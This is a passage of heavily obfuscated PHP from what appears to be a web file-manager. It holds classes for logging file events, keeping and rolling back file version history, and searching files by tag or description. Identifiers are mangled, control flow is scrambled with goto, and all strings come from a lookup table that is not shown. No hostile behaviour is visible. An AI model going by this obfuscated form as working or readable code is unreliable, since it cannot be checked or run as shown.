Model($fŞò”°Ì†‚[1130])->sourceInfo($C§Û£ªˆä“); $dâ›•‚¸½¬ = array($fŞò”°Ì†‚[2328] => $aŒ’˜¶Ìƒ, $fŞò”°Ì†‚[28] => $F²¨”ˆÉ‘ö[$fŞò”°Ì†‚[28]]); return $this->addEvent($C§Û£ªˆä“, $fŞò”°Ì†‚[2327], $dâ›•‚¸½¬); } public function eventFileEdit($A•‘º·ÜÙë) { $cãç‹ŠÒáÎ =& $_SERVER[¬ˆÚÂ”Éğä]; $d²Ó«¼Ï¤Ç = array($cãç‹ŠÒáÎ[2333] => $_SERVER[$cãç‹ŠÒáÎ[2334]], $cãç‹ŠÒáÎ[1765] => strtolower(ACTION)); return $this->addEvent($A•‘º·ÜÙë, $cãç‹ŠÒáÎ[2088], $d²Ó«¼Ï¤Ç); } public function eventRecycle($C­¼ó·Ö‚‚, $cÌÍ­Ù‰ğÄ) { return $this->addEvent($C­¼ó·Ö‚‚, $_SERVER[¬ˆÚÂ”Éğä][2329], $cÌÍ­Ù‰ğÄ); } public function eventRemove($b‡ØÀŠ”Ì) { $eòÕø¨á–Ó =& $_SERVER[¬ˆÚÂ”Éğä]; $dçöÕö•·é = Model($eòÕø¨á–Ó[1130])->sourceInfo($b‡ØÀŠ”Ì); $Fª°÷ç°œ = $dçöÕö•·é[$eòÕø¨á–Ó[28]]; return $this->addEvent($dçöÕö•·é[$eòÕø¨á–Ó[463]], $eòÕø¨á–Ó[2087], $Fª°÷ç°œ); } public function eventShare($eÔùô‰õê, $f®İ¬†¨ÅØ) { return $this->addEvent($eÔùô‰õê, $_SERVER[¬ˆÚÂ”Éğä][2098], $f®İ¬†¨ÅØ); } public function eventMove($BÑ†½°î¾Œ, $f§¯‰‘š£İ, $F†ñ†´‰¨î) { goto d¤èë¢°§Î; cõ½²ë‚¹°: $Cä„’ÍŠ°¸ = $F©ì§µøÓï->sourceInfo($f§¯‰‘š£İ); $E¶‘é¾â’ = $F©ì§µøÓï->sourceInfo($F†ñ†´‰¨î); $e±£æÊÒÊ† = array($aâ¹’•ğÜß[1020] => $f§¯‰‘š£İ, $aâ¹’•ğÜß[2335] => $Cä„’ÍŠ°¸[$aâ¹’•ğÜß[28]], $aâ¹’•ğÜß[2336] => $Cä„’ÍŠ°¸[$aâ¹’•ğÜß[468]], $aâ¹’•ğÜß[1021] => $F†ñ†´‰¨î, $aâ¹’•ğÜß[2337] => $E¶‘é¾â’[$aâ¹’•ğÜß[28]], $aâ¹’•ğÜß[2338] => $E¶‘é¾â’[$aâ¹’•ğÜß[468]]); goto e»ÄÁÏ­ç•; eŠÏ‡˜Í—»: $this->addEvent($f§¯‰‘š£İ, $aâ¹’•ğÜß[2339], $e±£æÊÒÊ†); goto BäãÉ†¤²; d¤èë¢°§Î: $aâ¹’•ğÜß =& $_SERVER[¬ˆÚÂ”Éğä]; $F©ì§µøÓï = Model($aâ¹’•ğÜß[1130]); $E©²©½›Š“ = $F©ì§µøÓï->sourceInfo($BÑ†½°î¾Œ); goto cõ½²ë‚¹°; e»ÄÁÏ­ç•: $this->addEvent($BÑ†½°î¾Œ, $aâ¹’•ğÜß[494], $e±£æÊÒÊ†); $E©²©½›Š“ = $F©ì§µøÓï->sourceInfo($BÑ†½°î¾Œ); $e±£æÊÒÊ† = array($aâ¹’•ğÜß[369] => $E©²©½›Š“[$aâ¹’•ğÜß[369]], $aâ¹’•ğÜß[28] => $E©²©½›Š“[$aâ¹’•ğÜß[28]]); goto eŠÏ‡˜Í—»; BäãÉ†¤²: } public function eventCopy($c“²ÙĞ Ñ‚) { $this->eventCreate($c“²ÙĞ Ñ‚, $_SERVER[¬ˆÚÂ”Éğä][492]); } public function eventRename($EéÒªÛƒÒÔ, $a™øëùŞ¸, $e‚‘»¼šî…) { $F¯µ‚ÁÏ¥ =& $_SERVER[¬ˆÚÂ”Éğä]; $C¦ôŒ¦·Œ = array($F¯µ‚ÁÏ¥[1020] => $a™øëùŞ¸, $F¯µ‚ÁÏ¥[1021] => $e‚‘»¼šî…); return $this->addEvent($EéÒªÛƒÒÔ, $F¯µ‚ÁÏ¥[1143], $C¦ôŒ¦·Œ); } public function eventAddComment($fğÁÖßá‚•, $bÃ”¿ÂçÏÂ) { return $this->addEvent($fğÁÖßá‚•, $_SERVER[¬ˆÚÂ”Éğä][2340], $bÃ”¿ÂçÏÂ); } public function eventAddDesc($C ’ÛÛ¿Ú, $a¥ª”×‚£É) { return $this->addEvent($C ’ÛÛ¿Ú, $_SERVER[¬ˆÚÂ”Éğä][2341], $a¥ª”×‚£É); } public function listBySource($EŞ¼¸Ô¾) { goto A· ‰Ñ¦ÛÎ; A· ‰Ñ¦ÛÎ: $c Ú†¬× =& $_SERVER[¬ˆÚÂ”Éğä]; $Cé‰ÎŠÈ¸ = Model($c Ú†¬×[1130])->sourceInfo($EŞ¼¸Ô¾); $bóæÎï¨‚© = array($c Ú†¬×[383] => $EŞ¼¸Ô¾); goto BÚ˜Æ³â‡Ñ; d«ºŠè‡´ç: return $this->eventListParse($B”÷É‹‹ì, $EŞ¼¸Ô¾); goto cœõÏ†Ôï¿; BÚ˜Æ³â‡Ñ: if ($Cé‰ÎŠÈ¸[$c Ú†¬×[370]] == $c Ú†¬×[83]) { $Cº«Á›ƒŞ = Model($c Ú†¬×[1130])->listSearchChildren($EŞ¼¸Ô¾, 20000); $Cº«Á›ƒŞ[] = $EŞ¼¸Ô¾ . $c Ú†¬×[361]; $bóæÎï¨‚© = array($c Ú†¬×[369] => array($c Ú†¬×[7], $Cº«Á›ƒŞ)); } $B”÷É‹‹ì = $this->where($bóæÎï¨‚©)->order($c Ú†¬×[2342])->selectPage(); if ($B”÷É‹‹ì[$c Ú†¬×[351]][$c Ú†¬×[352]] == 0) { $B”÷É‹‹ì[$c Ú†¬×[351]][$c Ú†¬×[352]] = 1; $B”÷É‹‹ì[$c Ú†¬×[354]] = array(array($c Ú†¬×[383] => $EŞ¼¸Ô¾, $c Ú†¬×[2325] => $Cé‰ÎŠÈ¸[$c Ú†¬×[463]], $c Ú†¬×[1441] => $Cé‰ÎŠÈ¸[$c Ú†¬×[378]], $c Ú†¬×[388] => $c Ú†¬×[2343], $c Ú†¬×[389] => $Cé‰ÎŠÈ¸[$c Ú†¬×[187]], $c Ú†¬×[1443] => $c Ú†¬×[33])); } goto d«ºŠè‡´ç; cœõÏ†Ôï¿: } private function eventListParse($b¶í”šÇõ, $dëõÛŒÁ‘¨) { goto E¥Æ¥•²À†; E¥Æ¥•²À†: $F”›¹Û¾„¯ =& $_SERVER[¬ˆÚÂ”Éğä]; $Fè†¿ï–§É = $b¶í”šÇõ[$F”›¹Û¾„¯[354]]; $Fãç†Ğ¡‚ = array_to_keyvalue($Fè†¿ï–§É, $F”›¹Û¾„¯[33], $F”›¹Û¾„¯[369]); goto bˆÙ¢õ²áî; F÷Ş„Î¶â…: $b¶í”šÇõ[$F”›¹Û¾„¯[354]] = $Fè†¿ï–§É; return $b¶í”šÇõ; goto fï³¬ÓÌ§; CÎ’´’¨Ûƒ: $Fãç†Ğ¡‚ = array_unique($Fãç†Ğ¡‚); $dİÅ„¼Š¦Ø = array_unique(array_to_keyvalue($Fè†¿ï–§É, $F”›¹Û¾„¯[33], $F”›¹Û¾„¯[1450])); $eùç†¸ù·¬ = Model($F”›¹Û¾„¯[479])->userListInfo($dİÅ„¼Š¦Ø); goto cÜäŞô…È‰; bˆÙ¢õ²áî: $C³³„Ø²¿À = array_to_keyvalue($Fè†¿ï–§É, $F”›¹Û¾„¯[33], $F”›¹Û¾„¯[2331]); foreach ($Fè†¿ï–§É as $C¤»³áŞ™ª) { $F¸©¦ˆ = $C¤»³áŞ™ª[$F”›¹Û¾„¯[405]]; if ($C¤»³áŞ™ª[$F”›¹Û¾„¯[29]] == $F”›¹Û¾„¯[494] && isset($F¸©¦ˆ[$F”›¹Û¾„¯[1020]])) { $Fãç†Ğ¡‚[] = $F¸©¦ˆ[$F”›¹Û¾„¯[1020]] . $F”›¹Û¾„¯[33]; $Fãç†Ğ¡‚[] = $F¸©¦ˆ[$F”›¹Û¾„¯[1021]] . $F”›¹Û¾„¯[33]; } if ($C¤»³áŞ™ª[$F”›¹Û¾„¯[29]] == $F”›¹Û¾„¯[2339] && isset($F¸©¦ˆ[$F”›¹Û¾„¯[369]])) { $Fãç†Ğ¡‚[] = $F¸©¦ˆ[$F”›¹Û¾„¯[369]] . $F”›¹Û¾„¯[33]; } } $Fãç†Ğ¡‚ = array_merge($Fãç†Ğ¡‚, $C³³„Ø²¿À, array($dëõÛŒÁ‘¨ . $F”›¹Û¾„¯[33])); goto CÎ’´’¨Ûƒ; cÜäŞô…È‰: $dÁ†«ºë¡ğ = Model($F”›¹Û¾„¯[760])->sourceListInfo($Fãç†Ğ¡‚, !0); foreach ($Fè†¿ï–§É as &$C¤»³áŞ™ª) { if ($C¤»³áŞ™ª[$F”›¹Û¾„¯[29]] == $F”›¹Û¾„¯[494] && isset($C¤»³áŞ™ª[$F”›¹Û¾„¯[405]][$F”›¹Û¾„¯[1020]])) { $C¤»³áŞ™ª[$F”›¹Û¾„¯[405]][$F”›¹Û¾„¯[1020]] = $dÁ†«ºë¡ğ[$C¤»³áŞ™ª[$F”›¹Û¾„¯[405]][$F”›¹Û¾„¯[1020]]]; $C¤»³áŞ™ª[$F”›¹Û¾„¯[405]][$F”›¹Û¾„¯[1021]] = $dÁ†«ºë¡ğ[$C¤»³áŞ™ª[$F”›¹Û¾„¯[405]][$F”›¹Û¾„¯[1021]]]; } if ($C¤»³áŞ™ª[$F”›¹Û¾„¯[29]] == $F”›¹Û¾„¯[2339] && isset($C¤»³áŞ™ª[$F”›¹Û¾„¯[405]][$F”›¹Û¾„¯[369]])) { $C¤»³áŞ™ª[$F”›¹Û¾„¯[405]][$F”›¹Û¾„¯[369]] = $dÁ†«ºë¡ğ[$C¤»³áŞ™ª[$F”›¹Û¾„¯[405]][$F”›¹Û¾„¯[369]]]; } $C¤»³áŞ™ª[$F”›¹Û¾„¯[391]] = $dÁ†«ºë¡ğ[$C¤»³áŞ™ª[$F”›¹Û¾„¯[369]]]; $C¤»³áŞ™ª[$F”›¹Û¾„¯[2344]] = $dÁ†«ºë¡ğ[$C¤»³áŞ™ª[$F”›¹Û¾„¯[2331]]]; if ($C¤»³áŞ™ª[$F”›¹Û¾„¯[29]] == $F”›¹Û¾„¯[2087]) { $C¤»³áŞ™ª[$F”›¹Û¾„¯[2344]] = $C¤»³áŞ™ª[$F”›¹Û¾„¯[391]]; $C¤»³áŞ™ª[$F”›¹Û¾„¯[2331]] = $C¤»³áŞ™ª[$F”›¹Û¾„¯[2344]][$F”›¹Û¾„¯[369]]; $C¤»³áŞ™ª[$F”›¹Û¾„¯[391]] = !1; $C¤»³áŞ™ª[$F”›¹Û¾„¯[369]] = $F”›¹Û¾„¯[33]; } $C¤»³áŞ™ª[$F”›¹Û¾„¯[2275]] = $eùç†¸ù·¬[$C¤»³áŞ™ª[$F”›¹Û¾„¯[1450]]]; } unset($C¤»³áŞ™ª); goto F÷Ş„Î¶â…; fï³¬ÓÌ§: } public function removeBySource($bƒ§ğÙŒ«Ì) { $dÓ½Ğ«ËŞ‹ = array($_SERVER[¬ˆÚÂ”Éğä][383] => $bƒ§ğÙŒ«Ì); $this->where($dÓ½Ğ«ËŞ‹)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\162\x63\x65\x5f\150\x69\x73\x74\157\162\x79"; public function addHistory($ašºö…ô¸„, $Bõ¸ùäÅÌ¹ = '') { $E¼æëòÊÕµ =& $_SERVER[¬ˆÚÂ”Éğä]; $B‡ë©ùƒ¿² = array($E¼æëòÊÕµ[383] => $ašºö…ô¸„[$E¼æëòÊÕµ[369]], $E¼æëòÊÕµ[1441] => isset($ašºö…ô¸„[$E¼æëòÊÕµ[379]]) ? $ašºö…ô¸„[$E¼æëòÊÕµ[379]] : $ašºö…ô¸„[$E¼æëòÊÕµ[378]], $E¼æëòÊÕµ[420] => $ašºö…ô¸„[$E¼æëòÊÕµ[419]], $E¼æëòÊÕµ[522] => $ašºö…ô¸„[$E¼æëòÊÕµ[77]], $E¼æëòÊÕµ[2345] => $Bõ¸ùäÅÌ¹); $EØñ³œ¿ô¶ = $GLOBALS[$E¼æëòÊÕµ[6]][$E¼æëòÊÕµ[84]][$E¼æëòÊÕµ[2346]]; if ($EØñ³œ¿ô¶ > 1) { $this->historyAutoClear($B‡ë©ùƒ¿²[$E¼æëòÊÕµ[369]]); $this->add($B‡ë©ùƒ¿²); } Model($E¼æëòÊÕµ[2347])->eventFileEdit($ašºö…ô¸„[$E¼æëòÊÕµ[369]]); } private function historyAutoClear($CÚêšî÷Ş°) { goto BøËåÖ÷; a‚›ŒÛ†ğ£: $c˜ÖòĞ—õ = array_to_keyvalue($Bëô­¯çÚó, $B–Œ·šª‹¿[33], $B–Œ·šª‹¿[419]); $c˜ÖòĞ—õ = array_slice($c˜ÖòĞ—õ, $aøöé‰ö´); if (!$b‚ù¢óíÏ || !$c˜ÖòĞ—õ) { return; } goto DĞÁ¨…ËŞ; bˆóªÄ…Œù: if ($aøöé‰ö´ >= 500) { return; } $d¯ŸÙ·‹ÁÏ = array($B–Œ·šª‹¿[383] => $CÚêšî÷Ş°); $Bëô­¯çÚó = $this->field($B–Œ·šª‹¿[2350])->where($d¯ŸÙ·‹ÁÏ)->order($B–Œ·šª‹¿[2342])->select(); goto Cå²êÅ©; DĞÁ¨…ËŞ: $d¯ŸÙ·‹ÁÏ = array($B–Œ·šª‹¿[385] => array($B–Œ·šª‹¿[7], $b‚ù¢óíÏ)); $this->where($d¯ŸÙ·‹ÁÏ)->delete(); Model($B–Œ·šª‹¿[422])->remove($c˜ÖòĞ—õ); goto FõîšŠÙ²; bŠ²¹×Ô…¬: $bæßŒˆšØ = $c»ËÉ±Ï¢¼ == $B–Œ·šª‹¿[2349] ? 3 : $Bµ‘çÂá„Á; if ($Bµ‘çÂá„Á <= 1) { $bæßŒˆšØ = 1; } $aøöé‰ö´ = $bæßŒˆšØ - 1; goto bˆóªÄ…Œù; Cå²êÅ©: if (!$Bëô­¯çÚó || $aøöé‰ö´ >= count($Bëô­¯çÚó)) { return; } $b‚ù¢óíÏ = array_to_keyvalue($Bëô­¯çÚó, $B–Œ·šª‹¿[33], $B–Œ·šª‹¿[367]); $b‚ù¢óíÏ = array_slice($b‚ù¢óíÏ, $aøöé‰ö´); goto a‚›ŒÛ†ğ£; BøËåÖ÷: $B–Œ·šª‹¿ =& $_SERVER[¬ˆÚÂ”Éğä]; $c»ËÉ±Ï¢¼ = Model($B–Œ·šª‹¿[1101])->get($B–Œ·šª‹¿[2348]); $Bµ‘çÂá„Á = $GLOBALS[$B–Œ·šª‹¿[6]][$B–Œ·šª‹¿[84]][$B–Œ·šª‹¿[2346]]; goto bŠ²¹×Ô…¬; FõîšŠÙ²: } public function listData($D…ŠôæÀÌ) { goto eˆøç“†“Ë; eˆøç“†“Ë: $eŸš Ìëá =& $_SERVER[¬ˆÚÂ”Éğä]; $a‰‰ù¹ñĞ¢ = array($eŸš Ìëá[383] => $D…ŠôæÀÌ); $A¦ÄñÉšî = $eŸš Ìëá[2351]; goto AÚ˜ ì; Cİõ‚¾¦Ä: $b¦©ˆùÛ£˜ = 3; if ($d‡Š¡İÛ… == $eŸš Ìëá[2349]) { $bŒ¯óßÓ˜ø[$eŸš Ìëá[354]] = array_slice($bŒ¯óßÓ˜ø[$eŸš Ìëá[354]], 0, $b¦©ˆùÛ£˜); $bŒ¯óßÓ˜ø[$eŸš Ìëá[351]] = array($eŸš Ìëá[2352] => 1, $eŸš Ìëá[2353] => 20, $eŸš Ìëá[2354] => 1, $eŸš Ìëá[2355] => count($bŒ¯óßÓ˜ø[$eŸš Ìëá[354]])); } return $bŒ¯óßÓ˜ø; goto EĞÎ…ğ¤¡Ô; AÚ˜ ì: $bŒ¯óßÓ˜ø = $this->field($A¦ÄñÉšî)->where($a‰‰ù¹ñĞ¢)->order($eŸš Ìëá[2342])->selectPage(); $this->_listAppendUser($bŒ¯óßÓ˜ø[$eŸš Ìëá[354]]); $d‡Š¡İÛ… = Model($eŸš Ìëá[1101])->get($eŸš Ìëá[2348]); goto Cİõ‚¾¦Ä; EĞÎ…ğ¤¡Ô: } protected function _listAppendUser(&$eªÄ²––) { $bĞìÌ¿ÍŸå =& $_SERVER[¬ˆÚÂ”Éğä]; $DŠª¥Ê„İ = array_to_keyvalue($eªÄ²––, $bĞìÌ¿ÍŸå[33], $bĞìÌ¿ÍŸå[1450]); $FøÉÔªÂéÈ = Model($bĞìÌ¿ÍŸå[479])->userListInfo($DŠª¥Ê„İ); foreach ($eªÄ²–– as &$BÖ’‘ƒš•) { $b®à­º´…¤ = $BÖ’‘ƒš•[$bĞìÌ¿ÍŸå[1450]]; $BÖ’‘ƒš•[$bĞìÌ¿ÍŸå[378]] = $FøÉÔªÂéÈ[$b®à­º´…¤] ? $FøÉÔªÂéÈ[$b®à­º´…¤] : !1; } unset($BÖ’‘ƒš•); } public function fileInfo($E—¹Úƒ¼äÕ) { $E’†Šôâ¤ë =& $_SERVER[¬ˆÚÂ”Éğä]; $bëŞå¹¬¹ˆ = $this->tablePrefix; $d¤µ…ÎéÔ = "{$bëŞå¹¬¹ˆ}\x69\x6f\x5f\x66\151\x6c\145\40\146\151\154\145\163\x20\x6f\156\40\146\x69\154\x65\163\x2e\146\x69\154\145\111\104\40\75\x20\150\151\163\x74\x6f\162\x79\x2e\146\151\154\145\111\104"; return $this->alias($E’†Šôâ¤ë[2356])->where(array($E’†Šôâ¤ë[385] => $E—¹Úƒ¼äÕ))->join($d¤µ…ÎéÔ, $E’†Šôâ¤ë[2357])->find(); } public function removeItem($E³â”›ÆÛ) { $eéÏÒµÍì­ =& $_SERVER[¬ˆÚÂ”Éğä]; $e¬Á®‘‹©“ = array($eéÏÒµÍì­[385] => $E³â”›ÆÛ); $Eğ‰Á«´Çé = $this->where($e¬Á®‘‹©“)->find(); if ($Eğ‰Á«´Çé) { $cäƒ¶„ë’¬ = $this->where($e¬Á®‘‹©“)->delete(); Model($eéÏÒµÍì­[422])->remove($Eğ‰Á«´Çé[$eéÏÒµÍì­[419]]); return $cäƒ¶„ë’¬; } return !1; } public function removeBySource($aØ­Ïàí—á) { goto CÈöµŸİ¬µ; CÈöµŸİ¬µ: $eâ™œ£¹„ì =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$aØ­Ïàí—á) { return !1; } if (!is_array($aØ­Ïàí—á)) { $aØ­Ïàí—á = array($aØ­Ïàí—á); } goto fÛèäŒ‰ÅÉ; däÇ– Ì«¿: return !0; goto AÊ›íà¸Ÿ; fÛèäŒ‰ÅÉ: $e·µËÊ†ìù = array($eâ™œ£¹„ì[383] => array($eâ™œ£¹„ì[7], $aØ­Ïàí—á)); $D£ÄŒ÷”Ü§ = $this->field($eâ™œ£¹„ì[420])->where($e·µËÊ†ìù)->select(); if ($D£ÄŒ÷”Ü§) { $this->where($e·µËÊ†ìù)->delete(); $F‘å•äçİ‘ = array_to_keyvalue($D£ÄŒ÷”Ü§, $eâ™œ£¹„ì[33], $eâ™œ£¹„ì[419]); Model($eâ™œ£¹„ì[422])->remove($F‘å•äçİ‘); } goto däÇ– Ì«¿; AÊ›íà¸Ÿ: } public function setDetail($CÁ±ÎÎÁ×², $b‡¡õµ¡¼) { $aéîĞÚÅÜ‘ =& $_SERVER[¬ˆÚÂ”Éğä]; return $this->where(array($aéîĞÚÅÜ‘[385] => $CÁ±ÎÎÁ×²))->save(array($aéîĞÚÅÜ‘[2345] => $b‡¡õµ¡¼)); } public function rollbackToItem($B…‚Í•²ˆ†, $A‘…øœŠñë) { goto eù•Í¦§ƒ¢; AÒ¾è©‰Ôë: return $this->where(array($B¼õ×ø¬¸†[385] => $A‘…øœŠñë))->delete(); goto AÒÜ”Ì“Î•; eù•Í¦§ƒ¢: $B¼õ×ø¬¸† =& $_SERVER[¬ˆÚÂ”Éğä]; $fõ”Ş»Ã = Model($B¼õ×ø¬¸†[760])->sourceInfo($B…‚Í•²ˆ†); $this->addHistory($fõ”Ş»Ã); goto a³óÂ‡ãÀ; a³óÂ‡ãÀ: $FèŸçÏÀÕò = $this->find($A‘…øœŠñë); $Bª¶°¼â = array($B¼õ×ø¬¸†[419] => $FèŸçÏÀÕò[$B¼õ×ø¬¸†[419]], $B¼õ×ø¬¸†[77] => $FèŸçÏÀÕò[$B¼õ×ø¬¸†[77]], $B¼õ×ø¬¸†[107] => time(), $B¼õ×ø¬¸†[379] => USER_ID); Model($B¼õ×ø¬¸†[760])->where(array($B¼õ×ø¬¸†[369] => $B…‚Í•²ˆ†))->save($Bª¶°¼â); goto AÒ¾è©‰Ôë; AÒÜ”Ì“Î•: } public function clearSame($DœÄø°å†›) { goto cé™óØË; a¶–…¥ÂÎ¤: $Dµ§áªÄ = array(); $a‹›ƒŸ„‹É = array(); foreach ($eÅ·õÍÄÏ as $eã‡Ûñ¡²ï) { if (!$eã‡Ûñ¡²ï || count($eã‡Ûñ¡²ï) <= 1) { continue; } foreach ($eã‡Ûñ¡²ï as $f¯ò§÷½ ¥) { $Dµ§áªÄ[] = $f¯ò§÷½ ¥[$b£œªÇØ«Ú[419]]; $a‹›ƒŸ„‹É[] = $f¯ò§÷½ ¥[$b£œªÇØ«Ú[367]]; } } goto eó‹ùöÊãó; cé™óØË: $b£œªÇØ«Ú =& $_SERVER[¬ˆÚÂ”Éğä]; $aöŞ—°£ğ = $this->listData($DœÄø°å†›); $eÅ·õÍÄÏ = array_to_keyvalue_group($aöŞ—°£ğ, $b£œªÇØ«Ú[419]); goto a¶–…¥ÂÎ¤; eó‹ùöÊãó: if (!$a‹›ƒŸ„‹É) { return; } $this->where(array($b£œªÇØ«Ú[367] => array($b£œªÇØ«Ú[7], $a‹›ƒŸ„‹É)))->delete(); Model($b£œªÇØ«Ú[422])->remove($Dµ§áªÄ); goto c¤¤é»…˜ğ; c¤¤é»…˜ğ: } public function userSpace() { $fŸË­ïØÎ… =& $_SERVER[¬ˆÚÂ”Éğä]; $e•ë¤êô»¢ = $this->tablePrefix; $dÈâñß·¿‰ = array($fŸË­ïØÎ…[1441] => USER_ID); $F¦ß–çÑ–– = "{$e•ë¤êô»¢}\151\157\137\146\151\154\145\x20\x66\x69\x6c\145\x73\40\157\x6e\x20\x66\151\x6c\x65\163\x2e\x66\x69\154\145\x49\104\x20\x3d\40\x68\151\x73\x74\157\x72\171\56\x66\151\154\145\x49\104"; return $this->alias($fŸË­ïØÎ…[2356])->where($dÈâñß·¿‰)->join($F¦ß–çÑ––, $fŸË­ïØÎ…[2357])->sum($fŸË­ïØÎ…[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($aÂ¦âéîÆù) { goto bÁ„Å¬¬ì¢; bÁ„Å¬¬ì¢: $f‰î œÒàİ =& $_SERVER[¬ˆÚÂ”Éğä]; $bóÅ˜÷øÆŞ = KodIO::fileTypeList(); $EÇâğÇËÅ = $bóÅ˜÷øÆŞ[$aÂ¦âéîÆù]; goto bÁùù—Ó’; bÁùù—Ó’: if (!$EÇâğÇËÅ) { return array(); } $c›¸Ö÷âÛ = $EÇâğÇËÅ[$f‰î œÒàİ[160]]; $AÀ‹³Ì—¨– = $f‰î œÒàİ[7]; goto eáê§ª¦Ó; eáê§ª¦Ó: if (!$EÇâğÇËÅ[$f‰î œÒàİ[160]]) { $a¥ãĞç‘Çº = array_to_keyvalue($bóÅ˜÷øÆŞ, $f‰î œÒàİ[33], $f‰î œÒàİ[160]); $c›¸Ö÷âÛ = implode($f‰î œÒàİ[47], $a¥ãĞç‘Çº); $AÀ‹³Ì—¨– = $f‰î œÒàİ[2305]; } $A÷ù…–è¡‘ = explode($f‰î œÒàİ[47], trim($c›¸Ö÷âÛ, $f‰î œÒàİ[47])); return array($AÀ‹³Ì—¨–, $A÷ù…–è¡‘); goto a³æñ¸Ş½©; a³æñ¸Ş½©: } public function listPathType($fñÕ¬â­×À) { $b£‚‰÷¾Ôí =& $_SERVER[¬ˆÚÂ”Éğä]; $E§ç‚êÙ¨Ì = $this->fileTypeWhere($fñÕ¬â­×À); if (!$E§ç‚êÙ¨Ì) { return array(); } $Bƒ©çÅã‹ = array($b£‚‰÷¾Ôí[523] => SourceModel::TYPE_USER, $b£‚‰÷¾Ôí[524] => USER_ID, $b£‚‰÷¾Ôí[520] => 0, $b£‚‰÷¾Ôí[521] => $E§ç‚êÙ¨Ì); return $this->listSource($Bƒ©çÅã‹); } public function listSearch($AøÎÛ —Ş¿, $fÍ´öê‰ˆ™ = 300) { goto E§£ØÖ„Ö½; fÀÈ‘«“·ò: $this->_listSearchDesc($e° ¥‚î¸, $AøÎÛ —Ş¿, $eİˆ­«İˆ¬); $this->_listSearchTag($e° ¥‚î¸, $AøÎÛ —Ş¿, $eİˆ­«İˆ¬); $this->_listSearchGroupTag($e° ¥‚î¸, $AøÎÛ —Ş¿, $eİˆ­«İˆ¬); goto Aâ¡ç“—˜»; Aâ¡ç“—˜»: $this->_listDataApply($e° ¥‚î¸[$AÉ²¸¬ĞïË[354]]); $this->_listMake($e° ¥‚î¸); return $e° ¥‚î¸; goto fÛ‰®ÃğŒ; E§£ØÖ„Ö½: $AÉ²¸¬ĞïË =& $_SERVER[¬ˆÚÂ”Éğä]; if (isset($AøÎÛ —Ş¿[$AÉ²¸¬ĞïË[2202]]) && $AøÎÛ —Ş¿[$AÉ²¸¬ĞïË[2202]]) { $AøÎÛ —Ş¿[$AÉ²¸¬ĞïË[2202]] = str_replace($AÉ²¸¬ĞïË[1606], $AÉ²¸¬ĞïË[2358], trim($AøÎÛ —Ş¿[$AÉ²¸¬ĞïË[2202]])); } $CÈ‹Ê¸•Ì’ = $this->_parseSearchWhere($AøÎÛ —Ş¿); goto c¦¦ğ®êëÃ; c¦¦ğ®êëÃ: if (!isset($CÈ‹Ê¸•Ì’[$AÉ²¸¬ĞïË[397]])) { $CÈ‹Ê¸•Ì’[$AÉ²¸¬ĞïË[397]] = 0; } $E»¢Ë‚ÕÜ = $AÉ²¸¬ĞïË[2359]; $eİˆ­«İˆ¬ = $E»¢Ë‚ÕÜ; goto f¨”ˆÛ¤»; f¨”ˆÛ¤»: $this->_listSearchBindPinyin($AøÎÛ —Ş¿, $CÈ‹Ê¸•Ì’, $E»¢Ë‚ÕÜ); $this->alias($AÉ²¸¬ĞïË[489])->_makeOrder(); $e° ¥‚î¸ = $this->distinct(!0)->field($E»¢Ë‚ÕÜ)->where($CÈ‹Ê¸•Ì’)->selectPage($fÍ´öê‰ˆ™); goto fÀÈ‘«“·ò; fÛ‰®ÃğŒ: } private function _listSearchTag(&$cŠÓĞ™½´‡, $c–•‡šÊèà, $CˆÏøŠœŠÔ) { goto B®ÕÚÏÃ—Ş; c²”»×‚¾£: if (!$E•›²‰ÃÀé) { return; } $báë¬Ö„ê = array($fáÉŠóæ´Ï[393] => array($fáÉŠóæ´Ï[7], $E•›²‰ÃÀé), $fáÉŠóæ´Ï[1450] => USER_ID); $aöŠ¸è¸ = Model($fáÉŠóæ´Ï[394])->field($fáÉŠóæ´Ï[75])->where($báë¬Ö„ê)->select(); goto aî˜ğ‹À¢½; aî˜ğ‹À¢½: $aöŠ¸è¸ = array_to_keyvalue($aöŠ¸è¸, $fáÉŠóæ´Ï[33], $fáÉŠóæ´Ï[75]); $D“Ö¯íÁõ = array_unique($aöŠ¸è¸); $this->_listSearchMerge($cŠÓĞ™½´‡, $c–•‡šÊèà, $CˆÏøŠœŠÔ, $D“Ö¯íÁõ); goto fßšù®±§‰; B®ÕÚÏÃ—Ş: $fáÉŠóæ´Ï =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$c–•‡šÊèà[$fáÉŠóæ´Ï[2202]] || $cŠÓĞ™½´‡[$fáÉŠóæ´Ï[351]][$fáÉŠóæ´Ï[340]] > 1) { return; } $e²ÅÖÖÈë = Model($fáÉŠóæ´Ï[2360])->listData(); goto c”œ¹É²ìµ; c”œ¹É²ìµ: $E•›²‰ÃÀé = array(); $eÉ¥‚µª¬Á = $c–•‡šÊèà[$fáÉŠóæ´Ï[2202]]; foreach ($e²ÅÖÖÈë as $D¨•Ôƒ¥ˆˆ) { $eª´Šæ¹¥« = $D¨•Ôƒ¥ˆˆ[$fáÉŠóæ´Ï[28]]; $d‘„òÙêÆ = str_replace($fáÉŠóæ´Ï[50], $fáÉŠóæ´Ï[33], Pinyin::encode($eª´Šæ¹¥«)); if (stripos($eª´Šæ¹¥«, $eÉ¥‚µª¬Á) !== !1 || stripos($d‘„òÙêÆ, $eÉ¥‚µª¬Á) !== !1) { $E•›²‰ÃÀé[] = $D¨•Ôƒ¥ˆˆ[$fáÉŠóæ´Ï[367]]; } } goto c²”»×‚¾£; fßšù®±§‰: } private function _listSearchDesc(&$B·‘ª¹½¥, $C‹¾ŒŞÙ®, $eÑÒÎö»ÍĞ) { goto bøŞ¨†ï»ˆ; D‡î•Œ‘É´: $eì­îà’á¢ = Model($EÈ‚•ÀŠ¢[506])->field($EÈ‚•ÀŠ¢[369])->where($A•‘®Òôö)->select(); $dá×”‰ùõ´ = array_to_keyvalue($eì­îà’á¢, $EÈ‚•ÀŠ¢[33], $EÈ‚•ÀŠ¢[369]); $this->_listSearchMerge($B·‘ª¹½¥, $C‹¾ŒŞÙ®, $eÑÒÎö»ÍĞ, $dá×”‰ùõ´); goto bµğÙŸ¿í; f«ÔĞã¢»Ï: $fÂÅŸË¯„ = array_unique($fÂÅŸË¯„); if (!$fÂÅŸË¯„) { return; } $A•‘®Òôö = array($EÈ‚•ÀŠ¢[369] => array($EÈ‚•ÀŠ¢[7], 